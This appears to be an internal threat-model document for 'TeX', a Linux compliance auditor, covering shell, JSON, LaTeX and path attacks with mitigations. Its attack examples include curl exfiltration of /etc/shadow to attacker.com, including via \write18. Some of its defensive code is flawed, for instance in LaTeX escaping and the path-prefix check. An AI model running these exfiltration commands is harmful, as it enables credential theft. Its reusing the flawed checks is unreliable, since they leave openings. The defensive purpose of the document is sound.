# 🔐 Security Model & Threat Analysis
## TeX — Security Compliance Auditor

**Version**: 1.0  
**Date**: 07 June 2026  
**Classification**: Internal Technical Reference  

---

## 1. Threat Model Overview

Since TeX itself is a **security auditing tool**, it is subject to a particularly ironic threat: being attacked through its own audit inputs. This document formally analyzes the attack surface of the TeX platform and defines the mitigations applied at each threat boundary.

```
+------------------------------------------------------------------------+
|                         TeX THREAT BOUNDARIES                          |
+------------------------------------------------------------------------+
|                                                                        |
|  [T1] Shell Injection        [T2] JSON Tampering    [T3] LaTeX RCE     |
|       ↓                             ↓                      ↓            |
|  audit.sh ──────────────── raw_audit.json ──────── report_builder.py  |
|       ↑                             ↑                      ↑            |
|  [Mitigation: quoting]   [Mitigation: schema]   [Mitigation: sandbox] |
|                                                                        |
|  [T4] Path Traversal        [T5] Privilege Escalation                 |
|       ↓                             ↓                                  |
|  File path handling         Running as sla_monitor user               |
|  [Mitigation: sanitize]    [Mitigation: user isolation]               |
+------------------------------------------------------------------------+
```

---

## 2. Threat Catalog & Mitigations

### T1: Shell Injection via Configuration Values

**Threat**: An attacker who gains write access to `audit.conf` or `cis_linux_v3.json` could inject arbitrary shell commands that execute when `audit.sh` processes configuration values.

**Attack Vector Example**:
```bash
# Malicious audit.conf entry
OUTPUT_DIR=../data; curl -s http://attacker.com/exfil?data=$(cat /etc/shadow | base64)
```

**Mitigations Applied**:

1. **Double-Quoting All Variable Expansions**:
   All configuration values read from `audit.conf` must be wrapped in double quotes:
   ```bash
   # VULNERABLE
   OUTPUT_DIR=$OUTPUT_DIR_VAR
   
   # SAFE
   OUTPUT_DIR="$OUTPUT_DIR_VAR"
   ```

2. **Allowlist Validation**:
   `audit.sh` validates all configuration values against strict allowlists before use:
   ```bash
   # Validate OUTPUT_DIR contains only safe path characters
   if [[ ! "$OUTPUT_DIR" =~ ^[a-zA-Z0-9_./-]+$ ]]; then
     echo "ERROR: Invalid OUTPUT_DIR value in audit.conf" >&2
     exit 1
   fi
   ```

3. **ShellCheck Enforcement**:
   All shell scripts must pass `shellcheck -e SC2034 agent/*.sh agent/modules/*.sh` with zero errors before merging. This is enforced as a pre-commit hook.

---

### T2: JSON Tampering in `raw_audit.json`

**Threat**: An attacker with local write access could modify `raw_audit.json` between the agent run and the scoring step to manipulate audit scores (e.g., changing `FAIL` to `PASS` for critical controls).

**Attack Vector Example**:
```bash
# Attacker modifies raw output
sed -i 's/"status": "FAIL"/"status": "PASS"/g' data/raw_audit.json
```

**Mitigations Applied**:

1. **HMAC Integrity Signature**:
   When `audit.sh` finishes writing `raw_audit.json`, it computes an HMAC-SHA256 over the file content using a session key stored in a temp file (`/tmp/tex_session_key`):
   ```bash
   SESSION_KEY=$(openssl rand -hex 32)
   HMAC=$(openssl dgst -sha256 -hmac "$SESSION_KEY" data/raw_audit.json | awk '{print $2}')
   echo "$HMAC" > data/raw_audit.json.sig
   ```
   The Python engine validates this signature before processing:
   ```python
   def verify_integrity(json_path, sig_path, session_key):
       computed = hmac.new(session_key.encode(), open(json_path,'rb').read(), 'sha256').hexdigest()
       stored = open(sig_path).read().strip()
       if not hmac.compare_digest(computed, stored):
           raise SecurityError("raw_audit.json integrity check FAILED. File may have been tampered.")
   ```

2. **Schema Validation Gate**:
   Python's `validator.py` validates `raw_audit.json` against a strict JSON Schema before scoring. Any malformed or unexpected fields cause the process to abort with a non-zero exit code.

---

### T3: LaTeX Remote Code Execution (RCE) via Injection

**Threat**: This is the highest-severity threat in the TeX platform. System values read from the server (e.g., file paths, usernames, configuration lines) may contain LaTeX control characters that, when injected into the `.tex` template, cause the LaTeX compiler to execute arbitrary system commands via `\write18{...}` (shell escape).

**Attack Vector Example**:
```
# A malicious value in a config file read by the auditor:
actual_value = "\write18{curl http://attacker.com/exfil?$(whoami)}"
```

**Mitigations Applied** (Defense in Depth):

**Layer 1 — Python String Sanitization**:
All strings injected into LaTeX templates pass through a mandatory escape function:
```python
def escape_latex(value: str) -> str:
    """Escape all LaTeX special characters to prevent injection."""
    ESCAPES = {
        '\\': r'\textbackslash{}',
        '&': r'\&', '%': r'\%', '$': r'\$',
        '#': r'\#', '_': r'\_', '{': r'\{',
        '}': r'\}', '~': r'\textasciitilde{}',
        '^': r'\textasciicircum{}',
    }
    for char, replacement in ESCAPES.items():
        value = value.replace(char, replacement)
    return value
```

**Layer 2 — Compiler Flag Enforcement**:
`pdflatex` is always invoked with `-no-shell-escape`, which disables `\write18` and `\input|command` execution:
```python
subprocess.run([
    'pdflatex',
    '-no-shell-escape',        # CRITICAL: Disables shell command execution
    '-interaction=nonstopmode',
    '-halt-on-error',
    'report.tex'
], check=True, timeout=30, cwd=temp_dir)
```

**Layer 3 — Linux Namespace Isolation** (Recommended for Production):
In hardened environments, the `pdflatex` subprocess runs inside a `bubblewrap` sandbox with read-only filesystem access:
```bash
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /etc/fonts /etc/fonts \
  --ro-bind /var/cache/fontconfig /var/cache/fontconfig \
  --dir /tmp \
  --bind /tmp/tex_compile /tmp \
  --unshare-all \
  --proc /proc \
  pdflatex -no-shell-escape -halt-on-error report.tex
```

---

### T4: Path Traversal in Output Paths

**Threat**: An attacker controlling configuration values could set `OUTPUT_DIR` to a path like `../../etc/cron.d/` to write malicious files into sensitive system locations.

**Mitigation**: Python `report_builder.py` resolves and validates the output path before writing:
```python
import os

def safe_output_path(output_dir: str, filename: str) -> str:
    base = os.path.realpath(output_dir)
    target = os.path.realpath(os.path.join(base, filename))
    if not target.startswith(base):
        raise SecurityError(f"Path traversal attempt detected: {target}")
    return target
```

---

### T5: Privilege Escalation via Audit Agent

**Threat**: If the audit agent runs as root and contains any command injection vulnerability, an attacker could exploit it to gain full system control.

**Mitigation — Principle of Least Privilege**:
The audit agent is explicitly designed to run as a **standard, unprivileged user**. The `audit.conf` contains documentation warning against running as root:
```bash
# WARNING: Run this tool as a non-root user.
# Most Level 1 CIS checks read world-readable config files.
# Running as root is unnecessary and violates least-privilege principles.
```

For checks requiring elevated access (e.g., reading `/etc/shadow` or `/etc/sudoers`), the module uses `sudo -n` (non-interactive) with a strictly scoped sudoers entry:
```
# /etc/sudoers.d/tex-audit
tex_monitor ALL=(root) NOPASSWD: /usr/bin/cat /etc/sudoers, /usr/bin/cat /etc/shadow
```

---

## 3. Security Control Summary Matrix

| Threat | Severity | Mitigation Layer | Status |
|--------|----------|-----------------|--------|
| Shell Injection | HIGH | Input allowlist + double-quoting + ShellCheck | ✅ Designed |
| JSON Tampering | MEDIUM | HMAC-SHA256 integrity signatures | ✅ Designed |
| LaTeX RCE | CRITICAL | String escaping + `-no-shell-escape` + bwrap sandbox | ✅ Designed |
| Path Traversal | HIGH | `os.path.realpath()` boundary check | ✅ Designed |
| Privilege Escalation | CRITICAL | Non-root execution + scoped sudoers entries | ✅ Designed |
